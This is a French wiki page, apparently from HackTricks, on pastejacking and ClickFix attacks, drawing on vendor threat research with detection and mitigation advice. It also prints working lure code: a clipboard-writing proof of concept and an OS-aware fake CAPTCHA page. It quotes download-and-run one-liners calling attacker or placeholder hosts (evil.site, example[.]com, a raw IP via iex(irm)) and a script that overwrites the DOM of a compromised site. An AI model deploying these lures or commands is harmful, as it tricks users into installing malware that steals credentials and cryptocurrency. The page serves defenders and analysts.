# Attaques de détournement du presse-papiers (Pastejacking)

> « Ne collez jamais quelque chose que vous n'avez pas copié vous-même. » – un conseil ancien, mais toujours valable

## Présentation

Le détournement du presse-papiers – également appelé *pastejacking* – exploite le fait que les utilisateurs copient-collent régulièrement des commandes sans les inspecter. Une page web malveillante (ou tout contexte compatible avec JavaScript, comme une application Electron ou Desktop) place programmatiquement du texte contrôlé par l'attaquant dans le presse-papiers système. Les victimes sont encouragées, généralement au moyen d'instructions d'ingénierie sociale soigneusement conçues, à appuyer sur **Win + R** (boîte de dialogue Exécuter), **Win + X** (Accès rapide / PowerShell), ou à ouvrir un terminal et à *coller* le contenu du presse-papiers, exécutant immédiatement des commandes arbitraires.

Comme **aucun fichier n'est téléchargé et aucune pièce jointe n'est ouverte**, la technique contourne la plupart des contrôles de sécurité des e-mails et du contenu web qui surveillent les pièces jointes, les macros ou l'exécution directe de commandes. L'attaque est donc populaire dans les campagnes de phishing diffusant des familles de malware courantes telles que NetSupport RAT, le loader Latrodectus ou Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers de remplacement d'adresses de wallet

Une autre variante du **détournement du presse-papiers** n'effectue pas du tout de collage de commandes : elle attend que la victime copie une **adresse de wallet de cryptomonnaie**, puis la remplace silencieusement par une adresse contrôlée par l'attaquant juste avant le collage. Cette technique est particulièrement efficace contre les formats d'adresses de wallet longs, car les utilisateurs ne vérifient souvent que les premiers et les derniers caractères.<sup>[[8]](#references)</sup>

Caractéristiques courantes observées dans le monde réel :
- **Thin loader + payload imbriqué** : l'application/l'exécutable visible ressemble à un outil légitime de trading ou de « profit », tandis que le véritable clipper est dissimulé plus profondément dans le bundle (par exemple, un loader .NET lançant un payload Rust imbriqué).
- **Remplacement piloté par regex** : le malware recherche des chaînes telles que `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ou même des chaînes génériques de **44 caractères similaires à Solana**, puis les remplace par les wallets de l'attaquant.
- **Rotation des wallets à grande échelle** : les échantillons Windows modernes peuvent intégrer **des milliers** de wallets de remplacement par devise au lieu d'une seule adresse statique, ce qui réduit la dégradation de la réputation du wallet après chaque vol.<sup>[[8]](#references)</sup>

### Fonctionnement d'un clipper sous Windows

Une implémentation courante consiste en une fenêtre masquée enregistrée avec **`AddClipboardFormatListener`**. À chaque mise à jour du presse-papiers, le malware appelle généralement :<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → accéder aux données actuelles du presse-papiers.
- **`GetClipboardData`** → lire le texte.
- **`EmptyClipboard`** + **`SetClipboardData`** → remplacer la chaîne du wallet par la valeur de l'attaquant.

Expressions regex minimales fréquemment observées dans les clippers :
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistance au niveau utilisateur suffit pour l’impact. Un schéma observé est le suivant :<sup>[[8]](#references)</sup>
- Copier le payload vers **`%APPDATA%\silke\silke.exe`**
- Créer un **LNK dans le dossier Startup** sous `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idées de détection :
- Processus qui appellent continuellement les clipboard APIs tout en écrivant sous `%APPDATA%` et dans le dossier **Startup** de l’utilisateur.
- Création d’un nouveau LNK/exécutable suivie de réécritures du clipboard contenant des adresses de wallet.
- Archives ou bundles de faux logiciels contenant de nombreux fichiers inutilisés ainsi qu’un petit launcher qui démarre un binaire imbriqué.

### Suppression de la quarantine par ingénierie sociale + persistance via LaunchAgent sur macOS

Sur macOS, certaines campagnes fournissent un utilitaire **`unlocker.command`** et demandent à la victime de faire un clic droit → **Open** si Gatekeeper indique que l’application est endommagée ou provient d’un développeur non identifié. Le script supprime simplement la quarantine et lance le fichier `.app` situé à proximité :<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Ce n’est **pas** un exploit de Gatekeeper ; il s’agit d’un **contournement de la quarantaine obtenu par ingénierie sociale** qui exploite le fait que les décisions de Gatekeeper dépendent de l’attribut étendu `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Après son exécution, le clipper peut persister en tant qu’utilisateur courant en écrivant :<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent avec `RunAtLoad` et `KeepAlive`

Un détail défensif utile est que certains échantillons implémentent un **watchdog auto-réparateur** qui réécrit le LaunchAgent et le wrapper toutes les ~30 secondes. Si vous supprimez d’abord le plist **sans arrêter le processus en cours**, le malware peut immédiatement le recréer.<sup>[[8]](#references)</sup> Ordre de nettoyage sûr :
1. Arrêter le processus actif du clipper.
2. Décharger/supprimer le plist du LaunchAgent.
3. Supprimer `~/launch.sh` et la payload copiée.

### Note sur la diffusion : une fausse réputation comme multiplicateur d’efficacité

Pour cette famille, le malware lui-même peut rester techniquement simple, tandis que la **couche de distribution** fait l’essentiel du travail : de fausses étoiles/forks GitHub, des avis/téléchargements sur SourceForge, des commentaires/vues de tutoriels YouTube et des commentaires/votes apparemment bénins sur VirusTotal sont utilisés pour donner au binaire une apparence fiable avant son exécution.<sup>[[8]](#references)</sup>

## Boutons de copie forcée et payloads masquées (one-liners macOS)

Certains infostealers macOS clonent des sites d’installation (par ex. Homebrew) et **imposent l’utilisation d’un bouton « Copy »** afin que les utilisateurs ne puissent pas sélectionner uniquement le texte visible. L’entrée du presse-papiers contient la commande d’installation attendue ainsi qu’une payload Base64 ajoutée (par ex. `...; echo <b64> | base64 -d | sh`), de sorte qu’un seul collage exécute les deux, tandis que l’interface masque l’étape supplémentaire.<sup>[[5]](#references)</sup>

## Preuve de concept JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Les anciennes campagnes utilisaient `document.execCommand('copy')`, tandis que les plus récentes s'appuient sur l'**API Clipboard** asynchrone (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Le flux ClickFix / ClearFake

1. L'utilisateur visite un site typosquatté ou compromis (par ex. `docusign.sa[.]com`)
2. Le JavaScript **ClearFake** injecté appelle un helper `unsecuredCopyToClipboard()` qui stocke silencieusement un one-liner PowerShell encodé en Base64 dans le presse-papiers.
3. Des instructions HTML indiquent à la victime : *« Appuyez sur **Win + R**, collez la commande et appuyez sur Entrée pour résoudre le problème. »*
4. `powershell.exe` s'exécute et télécharge une archive contenant un exécutable légitime ainsi qu'une DLL malveillante (classic DLL sideloading).
5. Le loader déchiffre des étapes supplémentaires, injecte du shellcode et installe une persistance (par ex. une tâche planifiée), exécutant finalement NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Exemple de chaîne NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart légitime) recherche `msvcp140.dll` dans son répertoire.
* La DLL malveillante résout dynamiquement les API avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les déchiffre à l'aide d'une clé XOR tournante `"https://google.com/"`, injecte le shellcode final et décompresse **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le downloader JScript dans **cscript.exe**
3. Récupère un payload MSI → dépose `libcef.dll` à côté d’une application signée → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
L'appel **mshta** lance un script PowerShell caché qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstruit `AutoIt3.exe` via `extrac32` et la concaténation de fichiers, puis exécute finalement un script `.a3x` qui exfiltre les identifiants du navigateur vers `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix : Clipboard → PowerShell → JS eval → Startup LNK avec C2 rotatif (PureHVNC)

Certaines campagnes ClickFix ignorent entièrement les téléchargements de fichiers et demandent aux victimes de coller un one-liner qui récupère et exécute du JavaScript via WSH, le rend persistant et fait tourner le C2 quotidiennement. Exemple de chaîne observée :<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caractéristiques clés
- URL obfusquée et inversée lors de l’exécution pour déjouer une inspection superficielle.
- JavaScript se persiste via un Startup LNK (WScript/CScript) et sélectionne le C2 en fonction du jour actuel, ce qui permet une rotation rapide des domaines.<sup>[[3]](#references)</sup>

Fragment JS minimal utilisé pour faire tourner les C2 en fonction de la date :<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
L’étape suivante déploie généralement un loader qui établit la persistence et récupère un RAT (p. ex. PureHVNC), en effectuant souvent un pinning TLS sur un certificat codé en dur et en découpant le trafic.<sup>[[3]](#references)</sup>

Idées de détection spécifiques à cette variante
- Arbre des processus : `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefacts de démarrage : LNK dans `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoquant WScript/CScript avec un chemin JS sous `%TEMP%`/`%APPDATA%`.
- Télémétrie du registre/RunMRU et des lignes de commande contenant `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Exécutions répétées de `powershell -NoProfile -NonInteractive -Command -` avec de gros payloads stdin pour transmettre de longs scripts sans lignes de commande longues.
- Scheduled Tasks qui exécutent ensuite des LOLBins tels que `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sous une tâche/un chemin ressemblant à ceux d’un updater (p. ex. `\GoogleSystem\GoogleUpdater`).

Chasse aux menaces
- Hostnames et URLs C2 renouvelés quotidiennement avec le motif `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Corréler les événements d’écriture dans le clipboard, suivis d’un collage via Win+R puis de l’exécution immédiate de `powershell.exe`.

Les équipes blue team peuvent combiner la télémétrie du clipboard, de la création de processus et du registre afin d’identifier précisément les abus de pastejacking :

* Registre Windows : `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserve l’historique des commandes **Win + R** – rechercher les entrées Base64/obfusquées inhabituelles.
* Security Event ID **4688** (Process Creation) lorsque `ParentImage` == `explorer.exe` et que `NewProcessName` appartient à { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** pour les créations de fichiers sous `%LocalAppData%\Microsoft\Windows\WinX\` ou dans des dossiers temporaires juste avant l’événement 4688 suspect.
* Capteurs EDR du clipboard (s’ils sont disponibles) – corréler `Clipboard Write` suivi immédiatement par un nouveau processus PowerShell.

## Pages de vérification de type IUAM (ClickFix Generator) : copie du clipboard vers la console + payloads tenant compte de l’OS

Des campagnes récentes produisent en masse de fausses pages de vérification CDN/navigateur (« Just a moment… », de type IUAM) qui poussent les utilisateurs à copier depuis leur clipboard des commandes spécifiques à leur OS dans des consoles natives. Cela déplace l’exécution hors de la sandbox du navigateur et fonctionne sous Windows comme sous macOS.<sup>[[4]](#references)</sup>

Caractéristiques principales des pages générées par le builder
- Détection de l’OS via `navigator.userAgent` afin d’adapter les payloads (Windows PowerShell/CMD contre macOS Terminal). Des leurres/no-ops optionnels peuvent être utilisés pour les OS non pris en charge afin de préserver l’illusion.
- Copie automatique dans le clipboard lors d’actions bénignes de l’UI (case à cocher/Copy), tandis que le texte visible peut différer du contenu du clipboard.
- Blocage des appareils mobiles et popover contenant des instructions étape par étape : Windows → Win+R→coller→Entrée ; macOS → ouvrir Terminal→coller→Entrée.
- Obfuscation optionnelle et injector single-file pour remplacer le DOM d’un site compromis par une UI de vérification stylée avec Tailwind (aucun nouvel enregistrement de domaine requis).<sup>[[4]](#references)</sup>

Exemple : divergence du clipboard + branchement tenant compte de l’OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistance macOS de l’exécution initiale
- Utilisez `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` afin que l’exécution se poursuive après la fermeture du terminal, réduisant ainsi les traces visibles.<sup>[[4]](#references)</sup>

Prise de contrôle en place de pages sur des sites compromis
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Idées de détection et de hunting spécifiques aux lures de type IUAM
- Web : pages qui lient la Clipboard API à des widgets de vérification ; discordance entre le texte affiché et le payload du presse-papiers ; branchement sur `navigator.userAgent` ; Tailwind + remplacement single-page dans des contextes suspects.
- Endpoint Windows : `explorer.exe` → `powershell.exe`/`cmd.exe` peu après une interaction avec un navigateur ; installateurs batch/MSI exécutés depuis `%TEMP%`.
- Endpoint macOS : Terminal/iTerm lançant `bash`/`curl`/`base64 -d` avec `nohup` à proximité d’événements liés au navigateur ; jobs en arrière-plan survivant à la fermeture du terminal.
- Corréler l’historique `RunMRU` de Win+R et les écritures dans le presse-papiers avec la création ultérieure de processus console.

Voir également les techniques complémentaires

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake continue de compromettre des sites WordPress et d’injecter du JavaScript loader qui enchaîne des hosts externes (Cloudflare Workers, GitHub/jsDelivr) et même des appels blockchain d’« etherhiding » (par exemple des POST vers des endpoints d’API Binance Smart Chain tels que `bsc-testnet.drpc[.]org`) pour récupérer la logique actuelle du lure. Les overlays récents utilisent largement de faux CAPTCHAs qui demandent aux utilisateurs de copier/coller un one-liner (T1204.004) au lieu de télécharger quoi que ce soit.<sup>[[6]](#references)</sup>
- L’exécution initiale est de plus en plus déléguée à des hosts de scripts signés/LOLBAS. En janvier 2026, certaines chaînes ont remplacé l’utilisation antérieure de `mshta` par le composant intégré `SyncAppvPublishingServer.vbs`, exécuté via `WScript.exe`, en transmettant des arguments de type PowerShell avec des alias/wildcards pour récupérer du contenu distant :<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` est signé et normalement utilisé par App-V ; associé à `WScript.exe` et à des arguments inhabituels (alias `gal`/`gcm`, cmdlets avec jokers, URLs jsDelivr), il devient une étape LOLBAS à signal élevé pour ClearFake.<sup>[[6]](#references)</sup>
- En février 2026, les charges utiles de faux CAPTCHA sont revenues à de simples download cradles PowerShell. Deux exemples actifs :<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La première chaîne est un grabber `iex(irm ...)` en mémoire ; la seconde utilise `WinHttp.WinHttpRequest.5.1`, écrit un fichier temporaire `.ps1`, puis le lance avec `-ep bypass` dans une fenêtre cachée.<sup>[[6]](#references)</sup>

Conseils de détection et de hunting pour ces variantes
- Lignée des processus : navigateur → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou PowerShell cradles immédiatement après des écritures dans le presse-papiers/Win+R.
- Mots-clés de la ligne de commande : `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domaines jsDelivr/GitHub/Cloudflare Worker, ou motifs `iex(irm ...)` avec adresse IP brute.
- Réseau : connexions sortantes vers des hôtes CDN worker ou des endpoints RPC blockchain depuis des script hosts/PowerShell peu après une navigation web.
- Fichiers/registre : création de `.ps1` temporaires sous `%TEMP%` et entrées RunMRU contenant ces one-liners ; bloquer ou alerter lorsqu’un LOLBAS signé (WScript/cscript/mshta) s’exécute avec des URL externes ou des chaînes d’alias obfusquées.

## Tactiques ClickFix de juin 2026 : télémétrie du collage, commentaires de fausse vérification et chaînage de LOLBin

La télémétrie récente de Red Canary montre que l’indicateur stable n’est **pas une commande exacte**, mais la combinaison de **collage-et-exécution assisté par l’utilisateur**, d’**interpréteurs de confiance/LOLBins**, de **flags obfusqués**, de **récupération distante** et d’**exécution immédiate**.<sup>[[7]](#references)</sup>

### Schémas opérateur notables

- **Télémétrie de confirmation du collage** : certains payloads exécutent `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` avant le véritable stage. Cela confirme l’interaction de l’utilisateur tout en gardant la fenêtre courte et discrète.
- **Commentaires de fausse vérification** : les one-liners PowerShell peuvent ajouter des chaînes telles que `# Security check ✔️ I'm not a robot Verification ID: 138105`, afin que la commande conserve une apparence liée à un CAPTCHA après avoir été collée dans l’historique de Run / `cmd.exe` / PowerShell.
- **Reconstruction dynamique de l’URL** : `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` évite la présence d’une URL statique dans la ligne de commande tout en effectuant un téléchargement-et-exécution en mémoire.
- **Exécution d’un installateur déguisé** : `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuse de la casse inhabituelle et de caractères similaires à des caractères Unicode dans les flags afin de contourner les détections fragiles tout en ressemblant à `msiexec.exe`.
- **Chaînes de LOLBin échappées par caret** : `cmd.exe` peut masquer les mots-clés avec des échappements `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), démarrer le shell imbriqué en mode réduit, enregistrer le contenu de l’attaquant avec une extension bénigne telle que `.pdf`, puis l’exécuter via `mshta`.<sup>[[7]](#references)</sup>
## Mesures d’atténuation

1. Renforcement du navigateur – désactiver l’accès en écriture au presse-papiers (`dom.events.asyncClipboard.clipboardItem`, etc.) ou exiger un geste de l’utilisateur.
2. Sensibilisation à la sécurité – apprendre aux utilisateurs à *saisir* les commandes sensibles ou à les coller d’abord dans un éditeur de texte.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control pour bloquer les one-liners arbitraires.
4. Contrôles réseau – bloquer les requêtes sortantes vers les domaines connus de pastejacking et de malware C2.

## Techniques associées

* **Discord Invite Hijacking** abuse souvent de la même approche ClickFix après avoir attiré les utilisateurs vers un serveur malveillant :

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Corriger le clic : prévenir le vecteur d’attaque ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC de Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Sous le rideau pur : du RAT au Builder puis au Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [La fabrique ClickFix : première révélation du générateur ClickFix IUAM](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, l’année de l’Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Analyses de renseignement : février 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Analyses de renseignement : juin 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Des étoiles aux upvotes : une fausse réputation alimente un crypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
